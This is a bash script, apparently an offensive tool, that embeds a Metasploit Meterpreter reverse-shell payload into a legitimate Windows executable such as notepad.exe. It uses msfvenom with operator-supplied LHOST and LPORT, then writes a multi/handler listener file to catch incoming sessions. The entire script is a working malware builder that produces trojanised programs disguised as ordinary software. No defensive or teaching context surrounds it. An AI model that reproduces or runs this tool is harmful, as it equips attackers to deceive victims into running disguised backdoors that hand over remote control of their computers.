#!/bin/bash

echo "==============================="
echo "      EXE Payload Injector     "
echo "==============================="

# Loop until valid LHOST
while true; do
    read -p "🌐 Enter LHOST: " lhost
    if [ -n "$lhost" ]; then
        break
    else
        echo "[!] LHOST cannot be empty. Please enter a valid IP or hostname."
    fi
done

# Loop until valid LPORT
while true; do
    read -p "🎯 Enter LPORT: " lport
    if [[ "$lport" =~ ^[0-9]+$ ]] && [ "$lport" -ge 1 ] && [ "$lport" -le 65535 ]; then
        break
    else
        echo "[!] LPORT must be a number between 1 and 65535."
    fi
done

# Loop to ensure the EXE file exists
while true; do
    read -p "Enter the path to a clean EXE file (e.g., notepad.exe): " input_exe
    if [ -f "$input_exe" ]; then
        break
    else
        echo "[!] File not found. Please enter a valid path to an EXE file."
    fi
done

# Detect architecture using file command
arch=$(file "$input_exe" | grep -qE "PE32\+|x86-64" && echo "x64" || echo "x86")

echo ""
echo "========================================="
echo "✅ Architecture detected: $arch"
echo "========================================="

# Loop until correct payload choice (same style as APK script)
while true; do
    if [ "$arch" == "x64" ]; then
        echo "Select Payload Type (x64):"
        echo "1) windows/x64/meterpreter/reverse_tcp"
        echo "2) windows/x64/meterpreter/reverse_http"
        echo "3) windows/x64/meterpreter/reverse_https"
        read -p "Enter choice [1-3]: " choice

        case $choice in
            1) payload="windows/x64/meterpreter/reverse_tcp"; break ;;
            2) payload="windows/x64/meterpreter/reverse_http"; break ;;
            3) payload="windows/x64/meterpreter/reverse_https"; break ;;
            *) echo "[!] Invalid choice. Please select 1, 2, or 3." ;;
        esac
    else
        echo "Select Payload Type (x86):"
        echo "1) windows/meterpreter/reverse_tcp"
        echo "2) windows/meterpreter/reverse_http"
        echo "3) windows/meterpreter/reverse_https"
        read -p "Enter choice [1-3]: " choice

        case $choice in
            1) payload="windows/meterpreter/reverse_tcp"; break ;;
            2) payload="windows/meterpreter/reverse_http"; break ;;
            3) payload="windows/meterpreter/reverse_https"; break ;;
            *) echo "[!] Invalid choice. Please select 1, 2, or 3." ;;
        esac
    fi
done

# Loop until valid output file name (must end with .exe)
while true; do
    read -p "Enter the output file name (e.g., evil.exe): " output_exe
    if [[ -n "$output_exe" && "$output_exe" == *.exe ]]; then
        break
    else
        echo "[!] Output file name cannot be empty and must end with .exe"
    fi
done

# Generate and inject the payload
echo "[*] Injecting payload ($payload) into $input_exe..."
msfvenom -p "$payload" LHOST=$lhost LPORT=$lport --platform windows -a "$arch" -x "$input_exe" -f exe -o "$output_exe"

# Check if injection was successful
if [ $? -eq 0 ]; then
    echo "[+] Payload injected successfully! Saved as: $output_exe"

    # Create Metasploit listener file
    listener_file="listener.r"
    echo "use exploit/multi/handler" > "$listener_file"
    echo "set payload $payload" >> "$listener_file"
    echo "set LHOST $lhost" >> "$listener_file"
    echo "set LPORT $lport" >> "$listener_file"
    echo "set ExitOnSession false" >> "$listener_file"
    echo "exploit -j" >> "$listener_file"

    echo "[+] Metasploit listener script saved as: $listener_file"
    echo "[*] You can run it using: msfconsole -r $listener_file"

else
    echo "[!] Injection failed. Please check your inputs."
fi

